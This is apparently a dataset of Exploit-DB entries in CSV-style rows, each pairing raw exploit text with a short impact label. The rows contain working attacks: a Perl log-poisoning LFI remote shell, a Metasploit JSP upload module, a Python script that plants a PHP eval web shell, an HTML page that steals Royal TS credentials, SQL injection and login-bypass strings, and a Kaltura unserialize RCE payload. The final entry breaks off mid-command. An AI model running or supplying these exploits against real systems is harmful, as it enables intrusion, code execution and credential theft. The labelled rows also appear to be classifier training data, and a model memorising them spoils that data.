http://localhost:8000/cgi-bin/..%2ftraversed.py {""text"": ""This is a Test""}   Workaround ==========  Subclass CGIHTTPRequestHandler and override the is_cgi() method  with a variant that first URL decodes the supplied path, for example:  class FixedCGIHTTPRequestHandler(CGIHTTPServer.CGIHTTPRequestHandler):     def is_cgi(self):         self.path = urllib.unquote(self.path)         return CGIHTTPServer.CGIHTTPRequestHandler.is_cgi(self)   Fix ===  Update to the latest Python version from the Mercurial repository at http://hg.python.org/cpython/   Security Risk =============  The vulnerability can be used to gain access to the contents of CGI binaries or the source code of CGI scripts. This may reveal sensitve information, for example access credentials. This can greatly help attackers in mounting further attacks and is therefore considered to pose a high risk. Furthermore attackers may be able to execute code that was not intended to be executed. However, this is limited to files stored in the server's working directory or in its subdirectories.  The CGIHTTPServer code does contain this warning: ""SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL"" Even when used on a local computer this may allow other local users to execute code in the context of another user.   Timeline ========  2014-04-07 Vulnerability identified 2014-06-11 Customer approved disclosure to vendor 2014-06-11 Vendor notified 2014-06-15 Vendor disclosed vulnerability in their public bug tracker            and addressed it in public source code repository 2014-06-23 CVE number requested 2014-06-25 CVE number assigned 2014-06-26 Advisory released   References ==========  http://bugs.python.org/issue21766   RedTeam Pentesting GmbH =======================  RedTeam Pentesting offers individual penetration tests, short pentests, performed by a team of specialised IT-security experts. Hereby, security weaknesses in company networks or products are uncovered and can be fixed immediately.  As there are only few experts in this field, RedTeam Pentesting wants to share its knowledge and enhance the public knowledge with research in security related areas. The results are made available as public security advisories.  More information about RedTeam Pentesting can be found at https://www.redteam-pentesting.de.   --  RedTeam Pentesting GmbH                   Tel.: +49 241 510081-0 Dennewartstr. 25-27                       Fax : +49 241 510081-99 52068 Aachen                    https://www.redteam-pentesting.de Germany                         Registergericht: Aachen HRB 14004 Geschäftsführer:                       Patrick Hof, Jens Liebchen",execute code in the context of another user,1
4794,"XZero Community Classifieds 4.95.11 - Local File Inclusion / SQL Injection #!/usr/bin/perl # # XZero Community Classifieds  <= v4.95.11 LFI & SQL Injection # linK : http://www.xzeroscripts.com # download: http://rapidshare.com/files/66809648/XZCl4.95.11.rar # original thread: http://en.rstzone.org/xzero-community-classifieds-v4-95-11-lfi-sql-in-t9394.rst # (c)od3d and f0unded by Kw3rLn from Romanian Security Team a.K.A http://rstzone.org # # Local file inclusion in index.php: # #  switch($xview) #        { #                      [ ..... ] #            case ""page""            : $page = ""$_GET[pagename].php"";    break; #               [ ..... ] #        } # #  include_once($page); # in common.inc.php line 40: $xview = $_GET['view'] ? $_GET['view'] : ""main""; # # SQL Injection in post.php # line 511: $sql = ""SELECT expireafter FROM $t_subcats WHERE subcatid = $_REQUEST[subcatid]""; # ( And more but useless cuz admin password is in config.inc.php) # # LFI: http://site.com/index.php?view=page&pagename=[Local_FIle]%00 # Example: http://www.diasporaromana.com/index.php?view=page&pagename=tetete # # SQL: http://site.com/index.php?view=post&cityid=2&lang=en&catid=2&subcatid=[SQL] # Example: http://www.diasporaromana.com/index.php?view=post&cityid=220&lang=en&catid=5&subcatid=18' # # And now exploit for LFI  use IO::Socket; use LWP::Simple;   @apache=( ""../../../../../var/log/httpd/access_log"", ""../../../../../var/log/httpd/error_log"", ""../apache/logs/error.log"", ""../apache/logs/access.log"", ""../../apache/logs/error.log"", ""../../apache/logs/access.log"", ""../../../apache/logs/error.log"", ""../../../apache/logs/access.log"", ""../../../../apache/logs/error.log"", ""../../../../apache/logs/access.log"", ""../../../../../apache/logs/error.log"", ""../../../../../apache/logs/access.log"", ""../logs/error.log"", ""../logs/access.log"", ""../../logs/error.log"", ""../../logs/access.log"", ""../../../logs/error.log"", ""../../../logs/access.log"", ""../../../../logs/error.log"", ""../../../../logs/access.log"", ""../../../../../logs/error.log"", ""../../../../../logs/access.log"", ""../../../../../etc/httpd/logs/access_log"", ""../../../../../etc/httpd/logs/access.log"", ""../../../../../etc/httpd/logs/error_log"", ""../../../../../etc/httpd/logs/error.log"", ""../../.. /../../var/www/logs/access_log"", ""../../../../../var/www/logs/access.log"", ""../../../../../usr/local/apache/logs/access_log"", ""../../../../../usr/local/apache/logs/access.log"", ""../../../../../var/log/apache/access_log"", ""../../../../../var/log/apache/access.log"", ""../../../../../var/log/access_log"", ""../../../../../var/www/logs/error_log"", ""../../../../../var/www/logs/error.log"", ""../../../../../usr/local/apache/logs/error_log"", ""../../../../../usr/local/apache/logs/error.log"", ""../../../../../var/log/apache/error_log"", ""../../../../../var/log/apache/error.log"", ""../../../../../var/log/ access_log"", ""../../../../../var/log/error_log"" );  print ""[RST] XZero Community Classifieds <= v4.95.11 Remote Command Execution Exploit\n""; print ""[RST] need magic_quotes_gpc = off\n""; print ""[RST] c0ded by Kw3rLN from Romanian Security Team [ http://rstzone.org ] \n\n"";   if (@ARGV < 3) {     print ""[RST] Usage: xzero.pl [host] [path] [apache_path]\n\n"";     print ""[RST] Apache Path: \n"";     $i = 0;     while($apache[$i])     { print ""[$i] $apache[$i]\n"";$i++;}     exit(); }  $host=$ARGV[0]; $path=$ARGV[1]; $apachepath=$ARGV[2];  print ""[RST] Injecting some code in log files...\n""; $CODE=""<?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?>""; $socket = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>""$host"", PeerPort=>""80"") or die ""[RST] Could not connect to host.\n\n""; print $socket ""GET "".$path.$CODE."" HTTP/1.1\r\n""; print $socket ""User-Agent: "".$CODE.""\r\n""; print $socket ""Host: "".$host.""\r\n""; print $socket ""Connection: close\r\n\r\n""; close($socket); print ""[RST] Shell!! write q to exit !\n""; print ""[RST] IF not working try another apache path\n\n"";  print ""[shell] "";$cmd = <STDIN>;  while($cmd !~ ""q"") {     $socket = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>""$host"", PeerPort=>""80"") or die ""[RST] Could not connect to host.\n\n"";      print $socket ""GET "".$path.""index.php?view=page&pagename="".$apache[$apachepath].""%00&cmd=$cmd HTTP/1.1\r\n"";     print $socket ""Host: "".$host.""\r\n"";     print $socket ""Accept: */*\r\n"";     print $socket ""Connection: close\r\n\n"";      while ($raspuns = <$socket>)     {         print $raspuns;     }     print ""[shell] "";     $cmd = <STDIN>; }  # milw0rm.com [2007-12-26]",Command Execution,1
34239,"Status2k Server Monitoring Software - Multiple Vulnerabilities # Exploit Title: Status2k Multiple Vulnerabilities/0days # Date: 6/20/2014 # Exploit Author: Shayan Sadigh (twitter.com/r1pplex) | <ienjoy.ripples@gmail.com # Vendor Homepage: http://status2k.com/ # Version: All # Tested on: Linux/Windows # CVE : CVE-2014-5088, CVE-2014-5089, CVE-2014-5090, CVE-2014-5091, CVE-2014-5092, CVE-2014-5093, CVE-2014-5094  1. Cross site scripting/XSS... there's tons, example admin login page, etc  login.php:  if (isset($_GET['username'])) { $useren = $_GET['username']; } if (isset($_POST['password'])) { $useren = $_POST['username']; } $q = mysql_query(""SELECT * FROM "".$prefix.""users""); $adminuser = $res['adminuser']; // Login Database $cusername = $_COOKIE[""S2KUser""]; if ( ($cusername == $adminuser) && ($cpassword == $adminpass) ) { $lgtrue = 1; } if ( ($useren == $adminuser) && ($passen == $adminpass) ) { setcookie(""S2KUser"", $useren); if ($passen && $useren) { if ($useren !== $adminuser) { echo '<div class=""alert-message error""                               Username ('.$useren.') Incorrect.</div'; }         <input type=""text"" name=""username"" size=""25""   simple injection can be done in the username field, <scriptalert(""poc"")</script, etc  Use CVE-2014-5088 for all of the XSS issues.   2. SQLi vulnerability in the GET (log) param... This isn't too useful seeing that if you had auth, much more damage could be done - refer to command injection lack of sanitization: in /admin/options/logs.php  $l = $_GET['log'];   $q = mysql_query(""SELECT * FROM "".$prefix.""users"");   $query = mysql_query(""SELECT * FROM "".$prefix.""logs WHERE id = '"".$l.""'"");   $result = mysql_fetch_array($query) or die(mysql_error());     $query = mysql_query(""SELECT * FROM "".$prefix.""logs WHERE id = '"".$l.""'"");     $result = mysql_fetch_array($query) or die(mysql_error());     $query = mysql_query(""SELECT * FROM "".$prefix.""logs WHERE id = '"".$l.""'"");     $result = mysql_fetch_array($query) or die(mysql_error());  - PoC: site.com/s2kdir/admin/options/logs.php?log=[sqli]  Use CVE-2014-5089.   3. Command injection This requires access to the Status2k Admin Panel, log-in and proceed to click the 'Logs' tab, then select 'Add Logs', type in any name and for the 'Location' field use command injection... Then browse to the created log via the 'Logs' tab again.  - example: Logs --Add Logs --; then Logs --newly created log  Name: test Location: /var/log/dmesg;pwd; uname -a localhost/admin/options/addlog.php?type=edit&id=5  so there's no sanitization in addlog.php which lets you put anything you want as a log location... the issue now is that in logs.php:  $logc = cmdrun($config['logcmd'].$result['location']);     $log = explode(""\n"", $logc);     $log = array_reverse($log);  cmdrun literally calls the equivalent of exec() and thus completely execution of a command.  if it is complaining about dmesg... try other log locations... such as /usr/local/apache/logs/suexec_log, also try other bash chars, such as  | & && ; $(), etc  Use CVE-2014-5090.   4. eval() [RCE] backdoor.. For about a year, status2k.com was hosting a backdoored version of their software... either they knew it or not, there was never an announcement when the backdoor was found (good job).  in the file /includes/functions.php: eval($_GET['multies']);  site.com/s2k/includes/functions.php?multies=inject_php_code here  PoC: site.com/s2k/includes/functions.php?multies=echo 'foobar';  Use CVE-2014-5091.   5. Another RCE status2k also lacks sanitization in the templates; /admin/options/editpl.php  one can literally place any malicious php code they want here and have it execute  // Let's make sure the file exists and is writable first. if (is_writable(""../../templates/"".$config['templaten'].""/"".$filename)) {      // In our example we're opening $filename in append mode.     // The file pointer is at the bottom of the file hence     // that's where $somecontent will go when we fwrite() it.     if (!$handle = fopen(""../../templates/"".$config['templaten'].""/"".$filename, 'w')) {          echo ""Cannot open file (../../templates/"".$config['templaten'].""/"".$filename."")"";          exit;     }      // Write $somecontent to our opened file.     if (fwrite($handle, $value) === FALSE) {         echo ""Cannot write to file (../../templates/"".$config['templaten'].""/"".$filename."")"";         exit;     } else { echo ""Success, $filename updated!"";  once again complete lack of sanitization.  Use CVE-2014-5092.   6. Design flaw by default Status2k does not remove the install directory (/install/), this may lead to an attacker resetting the admin credentials and thus logging in and causing further damage through RCE vectors listed above.  Use CVE-2014-5093.   7. Information leak... it is not shown by default on the index.php of status2k above version 2, however // PHPINFO ========== // ================== $action = $_GET[""action""]; if ($action == ""phpinfo"") { phpinfo(); die(); } allows anyone to view the server's phpinfo page (localhost/status/index.php?action=phpinfo)  Use CVE-2014-5094.",code execution,1
42702,"EMC CMCNE 11.2.1 - FileUploadController Remote Code Execution (Metasploit) require 'msf/core'  class MetasploitModule < Msf::Exploit::Remote 	Rank = GreatRanking  	include Msf::Exploit::Remote::HttpClient  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'EMC CMCNE FileUploadController Remote Code Execution', 			'Description'    => %q{ 				This module exploits a fileupload vulnerability found in EMC 				Connectrix Manager Converged Network Edition <= 11.2.1. The file 				upload vulnerability is triggered when sending a specially crafted 				filename to the FileUploadController servlet.  This allows the 				attacker to upload a malicious jsp file to anywhere on the remote 				file system. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => [ 'james fitts' ], 			'References'     => 				[ 					[ 'ZDI', '13-279' ], 					[ 'CVE', '2013-6810' ] 				], 			'Privileged'	=> true, 			'Platform' 	=> 'win', 			'Arch'	=> ARCH_JAVA, 			'Targets'	=> 				[ 					[ 'EMC CMCNE 11.2.1 / Windows Server 2003 SP2 ', {} ], 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Dec 18 2013'))  		register_options([ 			Opt::RPORT(80) 		], self.class) 	end  	def exploit  		peer = ""#{datastore['RHOST']}:#{datastore['RPORT']}"" 		deploy = ""..\\..\\..\\deploy\\dcm-client.war\\"" 		jsp = payload.encoded.gsub(/\x0d\x0a/, """").gsub(/\x0a/, """") 		@jsp_name = ""#{rand_text_alphanumeric(4 + rand(32-4))}.jsp""  		data = Rex::MIME::Message.new         data.add_part(""#{jsp}"", ""application/octet-stream"", nil, ""form-data; name=\""source\""; filename=\""#{deploy}#{@jsp_name}\"""") 		data.add_part(""#{rand_text_alpha_upper(5)}"", nil, nil, ""form-data; name=\""driverFolderName\"""")  		post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, ""--_Part_"")  		print_status(""#{peer} - Uploading the JSP Payload..."") 		res = send_request_cgi({             'method'    => 'POST',             'uri'       => normalize_uri(""HttpFileUpload"", ""FileUploadController.do""),             'ctype'     => ""multipart/form-data; boundary=#{data.bound}"",             'data'      => post_data         })  		if res.code == 200 and res.body =~ /SUCCESSFULLY UPLOADED FILES!/             print_good(""File uploaded successfully!"") 			print_status(""Executing '#{@jsp_name}' now..."")  			res = send_request_cgi({ 				'method'	=> 'GET', 				'uri'		=> normalize_uri(""dcm-client"", ""#{@jsp_name}"") 			})          else             print_error(""Does not look like the files were uploaded to #{peer}..."")         end   	end  end",upload a malicious jsp file to anywhere on the remote file system,1
45783,"Royal TS/X - Information Disclosure <!-- Title: Royal TS/X - Information Disclosure Author: Jakub Palaczynski Date: 10. July 2018 CVE: CVE-2018-18865  Affected product: =============  Royal TS/X < Royal TS v5 Beta / Royal TSX v4 Beta   Vulnerability - Information Disclosure: =============================  Any third party web application can steal credentials created in Royal TS/X when browser extension is enabled. Browser extension communicates using websockets (default TCP port 54890) and websockets do not use any validation to verify origin of the request.   PoC website: ========== -->    <!DOCTYPE html>   <meta charset=""utf-8"" />   <title>RoyalTS/X Exploit</title>   <script language=""javascript"" type=""text/javascript"">    var wsUri = ""ws://127.0.0.1:54890/"";   var output;    function init()   {     output = document.getElementById(""output"");     testWebSocket();   }    function testWebSocket()   { writeToScreen(""Let's retrieve some data..."");     websocket = new WebSocket(wsUri);     websocket.onopen = function(evt) { onOpen(evt,""{\""Command\"":\""GetDocuments\"",\""Arguments\"":null,\""PluginVersion\"":\""1.0.0.0\"",\""RequestId\"":\""aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa\""}"") };     websocket.onclose = function(evt) { onClose(evt) };     websocket.onmessage = function(evt) { onMessage(evt) };     websocket.onerror = function(evt) { onError(evt) };   }    function onOpen(evt,message)   {     doSend(message);   }    function onClose(evt)   {   }    function onMessage(evt)   { var obj = JSON.parse(evt.data); if (obj['Command'] == ""GetDocuments"") { for (var x in obj['ResponseData']){ writeToScreen(""Name: "" + obj['ResponseData'][x]['Name']); writeToScreen(""Unlocked: "" + obj['ResponseData'][x]['Unlocked']); for (var y in obj['ResponseData'][x]['Credentials']){ writeToScreen(""Username: "" + obj['ResponseData'][x]['Credentials'][y]['UserName']); writeToScreen(""URL: "" + obj['ResponseData'][x]['Credentials'][y]['URL']); if (obj['ResponseData'][x]['Unlocked'] == true){ websocket.close(); websocket = new WebSocket(wsUri); websocket.onopen = function(evt) { onOpen(evt,""{\""Command\"":\""GetLoginInformation\"",\""Arguments\"":{\""CredentialId\"":\"""" + obj['ResponseData'][x]['Credentials'][y]['ID'] + ""\""},\""PluginVersion\"":\""1.0.0.0\"",\""RequestId\"":\""aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa\""}"") }; websocket.onclose = function(evt) { onClose(evt) }; websocket.onmessage = function(evt) { onMessage(evt) }; websocket.onerror = function(evt) { onError(evt) }; } } } } else { if (obj['Command'] == ""GetLoginInformation"") { var obj = JSON.parse(evt.data); writeToScreen(""AutoFill Data: "" + atob(obj['ResponseData'])); } }   }    function onError(evt)   {     writeToScreen('<span style=""color: red;"">ERROR:</span> ' + evt.data);   }    function doSend(message)   {     websocket.send(message);   }    function writeToScreen(message)   {     var pre = document.createElement(""p"");     pre.style.wordWrap = ""break-word"";     pre.innerHTML = message;     output.appendChild(pre);   }    window.addEventListener(""load"", init, false);    </script>    <h2>RoyalTS/X Exploit</h2>    <div id=""output""></div>  <!-- Contact: =======  Jakub[dot]Palaczynski[at]gmail[dot]com -->",steal credentials created in Royal TS /X when browser extension is enabled,1
32170,Softbiz Image Gallery - 'index.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/30546/info  Softbiz Photo Gallery is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  http://www.example.com/index.php?latest=[XSS] http://www.example.com/index.php?msg=[XSS],execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
7013,"DevelopItEasy Events Calendar 1.2 - Multiple SQL Injections                           ||          ||   | ||                            o_,_7 _||  . _o_7 _|| 4_|_||  o_w_,                    ( :   /    (_)    /           (   .   |-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=| |     _                   __           __       __          ______     | |   /' \            __  /'__`\        /\ \__  /'__`\       /\  ___\    | |  /\_, \    ___   /\_\/\_\L\ \    ___\ \ ,_\/\ \/\ \  _ __\ \ \__/    | |  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\ \___``\  | |     \ \ \/\ \/\ \ \ \ \/\ \L\ \/\ \__/\ \ \_\ \ \_\ \ \ \/ \/\ \L\ \ | |      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\  \ \____/ | |       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/   \/___/  | |                  \ \____/ >> Kings of injection                      | |                   \/___/                                             | |                                                                      | |-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=|   <<!>> Found by  :  Cyb3r-1sT  <<!>> C0ntact : cyb3r-1st [at] hotmail.com                      <<!>> Groups : InjEctOr5 T3am   <<!>> site : www.tryag.cc/cc  ======================================================= +++++++++++++++++++ Script information+++++++++++++++++ =======================================================   <<->> script      : Events Calendar v 1.2   <<->> script site : www.developiteasy.com/events-calendar-v-1.2-p-65.html?cPath=58&osCsid=7sanrl2anes1t050jhc6ivnt13                   ======================================================= +++++++++++++++++++++++ Exploit +++++++++++++++++++++++ =======================================================   <<->> D0rk    : find it  <<->> Exploit :>>>   >>>> www.site.me/calendar_details.php?id=-26+union+select+0,0,concat(user_name,0x3a,user_pass),0,0,0,0,0,0,0+from+login--         >>> demo ::: www.developiteasy.com/events_calendar/calendar_details.php?id=-26+union+select+0,0,concat(user_name,0x3a,user_pass),0,0,0,0,0,0,0+from+login--   <<->> Exploit <<->> bypass <<->>           >>>> www.developiteasy.com/events_calendar/admin                  >>> user : cyb3r-1st ' or ' 1=1--     ( or u can use ' or 1=1-- )                  >>> pass : cyb3r-1st ' or ' 1=1--     ( or u can use ' or 1=1-- )   ======================================================= ++++++++++++++++++++++ Greetz +++++++++++++++++++++++++ =======================================================   <<->> All freinds and all muslims  # milw0rm.com [2008-11-06]",code execution,1
4643,"VigileCMS 1.8 - Stealth Remote Command Execution #!/usr/bin/python #-*- coding: iso-8859-15 -*- '''  _   _                                   _          | |_| |_  ___  _  _ __  __ _ _ _ __ _ __| |_____ __ |  _| ' \/ -_)|_|| '_ \/ _` | '_/ _` / _` / _ \ \ /  \__|_||_\___||_|| .__/\__,_|_| \__,_\__,_\___/_\_\                  |_|                                ------------------------------------------------------------------------------------------------ This is a Public Exploit. 22/11/2007 (dd-mm-yyyy) ------------------------------------------------------------------------------------------------ Ã‚Â§ 0day VigileCMS <= 1.8 Stealth - Remote Command Execution Ã‚Â§ Vendor:	  http://www.vigilenapoletano.it Severity: Highest Author:	  The:Paradox Italy r0x.  Visit inj3ct-it.org  Comments: This exploit was coded to show some people what a real vulnerability is.  ------------------------------------------------------------------------------------------------ Related Codes:  --- index.php; line 64:  if (isset($_COOKIE[rem_user]) and isset ($_COOKIE[rem_pass]) and !isset($_SESSION[user])) {     if(file_exists(USERS_TAB.""/$_COOKIE[rem_user].$_COOKIE[rem_pass].php"")){         $_SESSION[user] = $_COOKIE[rem_user];         $_SESSION[pass] = $_COOKIE[rem_pass];         logthis(""$_SESSION[user] si ÃƒÂ¨ collegato al Sito: riconosciuto con Cookie!"");         UserVisita ();// aggiornamento database utente per numero di visite     } }  --- func.inc.php; line 93:  function is_admin(){ 	//## FUNCTION ##     if( (isset($_SESSION[user]) and isset($_SESSION[pass])) && (file_exists(ADMIN_TAB.""/$_SESSION[user].$_SESSION[pass].php"")) ){ 	return true;     } else {         return false;     } }  --- func.inc.php; line 109:  function is_superadmin(){ 	//## FUNCTION ##     include (LOGS_TAB.""/creazione.php"");     if (isset($_SESSION[""user""]) and isset($_SESSION[""pass""]) and ($_SESSION[user]==$primo_amministra)) { 	return true;     } else {         return false;     } }  --- vedipm.php; line 210:              if ($_POST[ttl] =="""") $_POST[ttl]=""Nessun oggetto"";              $_POST[ttl] =stripslashes($_POST[ttl]);             $_POST[ttl] =htmlspecialchars($_POST[ttl]); // impedisce visualizzazioni caratteri html e <script> maligni tipo javascript             $_POST[cont]=stripslashes($_POST[cont]);             $_POST[cont]=htmlspecialchars($_POST[cont]); // impedisce visualizzazioni caratteri html e <script> maligni tipo javascript             $_POST[cont]=str_replace(""\r\n"",""[br]"",$_POST[cont]);             $_POST[cont]=str_replace(""<~>"",""<|>"",$_POST[cont]);             $_POST[ttl]=str_replace(""<~>"",""<|>"",$_POST[ttl]);              $time = time();              $newpm = fopen (PM_TAB.""/$_POST[to]"", ""a"");             fwrite ($newpm, ""$_POST[ttl]<~>$_POST[cont]<~>$_SESSION[user]<~>$time<~>non_letto\r\n"");             fclose($newpm); ------------------------------------------------------------------------------------------------ Bug Explanation:  The platform presents some vulnerabilities in the ""login system"" and in the ""private message sender system"". The first vulnerability is in index.php that verifies the login without sql database verifying the existence of files with the structure Nick.HashMD5Password.php in a dir ""db"". The cms'coder didn't thought about directory transversal. In fact if we try to login with these cookies:  rem_user = /../users/Nick rem_pass = HashMD5Password  Where Nick and HashMD5Password are an existent UserName and MD5 Password's Hash, we'll gain administration rights. This happens because the ""function is_admin"" will check the file existence of /db/admin/../users/Nick.HashMD5Password.php Obvious this may work with any file (with some collateral errors because it missed an include :P) Whatever this doesn't make us able to do a lot of action in control panel because we will not have superadmin rights (see is_superadmin() function) The second vulnerability is in vedipm.php and make us able to write a file on the server, but we can't get a RCE because our action are limited by htmlspecialchars that changes characters of php code (< >). Whatever $_SESSION[user] is not htmlspecialcharsed. Using the first and the second vulnerability we can gain a RCE. We will create a ""file named with php code"" , with this we'll login and get an evil $_SESSION[user] that will be written in a php file. ------------------------------------------------------------------------------------------------ A lot of other Vulnerabilities have been found in this platform, but their functionality depends by the configuration OFF of MAGIC QUOTES or other uses of vulnerabilities I explained , so they were not published. ------------------------------------------------------------------------------------------------ Google Dork-> Powered by Cms Vigile ------------------------------------------------------------------------------------------------ Use this exploit at your own risk. You are responsible for your own deeds. Not tested on version < of 1.6 ------------------------------------------------------------------------------------------------ Use your brain, do not lame. Enjoy. =) ''' #Python exploit starts: #Version 2 of this exploit. Not the one published on some sites.  import sys, httplib, urllib 	 print ""\n################################################"" print ""            VigileCMS <= 1.8 Stealth            "" print ""            Remote Command Execution            "" print ""                                                "" print ""            Discovered By The:Paradox           ""           print ""                                                "" print "" Usage:                                         ""  print "" %s [Target] [Path]         	               "" % (sys.argv[0]) print ""                                                ""	 print "" Example:                                       "" 			 print "" python %s 127.0.0.1 /vigilecms/                "" % (sys.argv[0]) print ""                                                ""	 print ""    You may have to set other options in the    ""	 print ""        code, like port if it isn't 80          "" print ""     or options for old viglecms' versions.     ""	 print ""                                                ""		 print ""################################################\n"" if len(sys.argv)<=1:	sys.exit() else:   print ""[.]Exploit Starting.""		  #Some Vars old = 0 #set to 1 if you are trying to exploit a 1.6 vigile cms version port = 80 db = ""db"" #Directory of database target = sys.argv[1] try:directory = sys.argv[2] except IndexError:directory = ""/"" #Starting ver1 = """" ver2 = """" try: 	#Verifing  /db/index.php 	conn = httplib.HTTPConnection(target,port) 	conn.request(""GET"", ""%s%s/index.php"" % (directory,db)) 	r1 = conn.getresponse() 	print ""Verifing existence of-> %s%s%s/index.php"" % (target,directory,db),r1.status, r1.reason 	if r1.status == 404: 		print ""[-]%s/index.php not found (404)."" % (db) 		ver1 = ""no"" 	conn.close() 	#Verifing  /pm/index.php 	conn = httplib.HTTPConnection(target,port) 	conn.request(""GET"", ""%s%s/pm/index.php"" % (directory,db)) 	r1 = conn.getresponse() 	print ""Verifing existence of-> %s%s%s/pm/index.php"" % (target,directory,db),r1.status, r1.reason 	if r1.status == 404: 		print""[-]%s/pm/index.php not found (404)."" % (db) 		ver2 = ""no"" except httplib.ResponseNotReady: 	sys.exit(""[-]ResponseNotReady. Aborted. Check your connection."")  if old == 1:  	pt = ""/"" 	pt2 = ""?"" else:  	pt = ""?"" 	pt2 = ""&"" 	 if ver1 == ""no"" or ver2 == ""no"":  	transversal = "".."" 	print ""[-]One or more Get request returned 404 error. Trying to continue with / path."" else : transversal = """"  conn = httplib.HTTPConnection(target,port) conn.request(""POST"", ""%s/index.php%spag=vedipm%sinviapm=true"" % (directory,pt,pt2), urllib.urlencode({'to': transversal +'/../<?php eval(stripslashes($_GET[dox])); ?>.paradox-got-this-one.php', 'cont': 1}), {""Accept"": ""text/plain"",""Cookie"": ""rem_user=%2F..%2F; rem_pass=%2Findex;"",""Content-type"": ""application/x-www-form-urlencoded""}) response = conn.getresponse() print ""[.]Doing Post Connection #1 -->"",response.status, response.reason conn.close()  conn = httplib.HTTPConnection(target,port) conn.request(""POST"", ""%s/index.php%spag=vedipm%sinviapm=true"" % (directory,pt,pt2), urllib.urlencode({'to': transversal +'/../igotyourbox.php' , 'cont': 1}), {""Accept"": ""text/plain"",""Cookie"": ""rem_user=""+ transversal +""%2F..%2F%3C%3Fphp+eval(stripslashes(%24_GET%5Bdox%5D))%3B+%3F%3E; rem_pass=paradox-got-this-one;"",""Content-type"": ""application/x-www-form-urlencoded""}) response = conn.getresponse() print ""[.]Doing Post Connection #2 -->"",response.status, response.reason conn.close() try: 	if transversal == "".."":	path = ""%sigotyourbox.php"" % (directory) 	elif transversal == """": 	path = ""%s%s/igotyourbox.php"" % (directory,db) 			 	conn = httplib.HTTPConnection(target,port) 	conn.request(""GET"", path) 	r1 = conn.getresponse() 	conn.close() except httplib.ResponseNotReady: 	sys.exit(""[-]ResponseNotReady. Aborted."") 	 print ""[.]Verifing Exploit Success..."" if r1.status == 404: 	sys.exit(""[-]Exploit Failed."") else: 	print ""[+]Done.\n[+]Removing the page..."" 	conn = httplib.HTTPConnection(target,port) 	getrm = path + ""?dox=unlink('%3C%3Fphp+eval(stripslashes(%24_GET%5Bdox%5D))%3B+%3F%3E.paradox-got-this-one.php');""  	conn.request(""GET"", getrm) 	print ""[+]Success :D Exploited.\n\n A PHP Page Has Been Created -> %s%s \n With Content:\n <?php eval(stripslashes($_GET[dox])); ?>\n Execute your php codes :P Have Fun :D\n\n-= Paradox Got This One :D =-\n"" % (target,path)  # milw0rm.com [2007-11-22]",Command Execution,1
39563,"Kaltura Community Edition < 11.1.0-2 - Multiple Vulnerabilities (    , )     (,   .   '.' ) ('.    ',    ). , ('.   ( ) (   (_,) .'), ) _ _,  /  _____/  / _  \    ____  ____   _____  \____  \==/ /_\  \ _/ ___\/  _ \ /     \  /       \/   |    \\  \__(  <_> )  Y Y  \ /______  /\___|__  / \___  >____/|__|_|  /         \/         \/.-.    \/         \/:wq                     (x.0)                   '=.|w|.='                   _=''""''=.                  presents..  Kaltura Community Edition Multiple Vulnerabilities Affected versions: Kaltura Community Edition <=11.1.0-2  PDF: http://www.security-assessment.com/files/documents/advisory/Kaltura-Multiple-Vulns.pdf  +-----------+ |Description| +-----------+ The Kaltura platform contains a number of vulnerabilities, allowing unauthenticated users to execute code, read files, and access services listening on the localhost interface. Vulnerabilities present in the application also allow authenticated users to execute code by uploading a file, and perform stored cross site scripting attacks from the Kaltura Management Console into the admin console. Weak cryptographic secret generation allows unauthenticated users to bruteforce password reset tokens for accounts, and allows low level users to perform privilege escalation attacks.  +------------+ |Exploitation| +------------+ ==Unserialize Code Execution== The following PHP POC will generate an object that leads to code execution when posted to an endpoint present on the server. Authentication is not required. [POC] <?php $init = ""system('id;uname -a')""; $cmd = $init."".die()""; $len = strlen($cmd); $obj=""a:1:{s:1:\""z\"";O:8:\""Zend_Log\"":1:{s:11:\""\0*\0_writers\"";a:1:{i:0;O:20:\""Zend_Log_Writer_Mail\"":5:{s:16:\""\0*\0_eventsToMail\"";a:1:{i:0;i:1;}s:22:\""\0*\0_layoutEventsToMail\"";a:0:{}s:8:\""\0*\0_mail\"";O:9:\""Zend_Mail\"":0:{}s:10:\""\0*\0_layout\"";O:11:\""Zend_Layout\"":3:{s:13:\""\0*\0_inflector\"";O:23:\""Zend_Filter_PregReplace\"":2:{s:16:\""\0*\0_matchPattern\"";s:7:\""/(.*)/e\"";s:15:\""\0*\0_replacement\"";s:$len:\""$cmd\"";}s:20:\""\0*\0_inflectorEnabled\"";b:1;s:10:\""\0*\0_layout\"";s:6:\""layout\"";}s:22:\""\0*\0_subjectPrependText\"";N;}}};}""; $sploit = base64_encode($obj); echo $sploit; ?> ------------  The Base64 encoded object generated above should be included in the kdata section of the following curl request:  $curl http://[HOST]/index.php/keditorservices/redirectWidgetCmd?kdata=$[sploit]  ==Arbitrary File Upload== Users authenticated to the KMC with appropriate privileges can upload arbitrary files through the ""Upload Content"" functionality. This can be used to upload a PHP web shell as an image file and gain command execution. In order to excute the code, the on-disk path of the uploaded file must be obtained, and then browsed to directly. Obtaining the uploaded file's path can be achieved with the following command. [POC] $curl 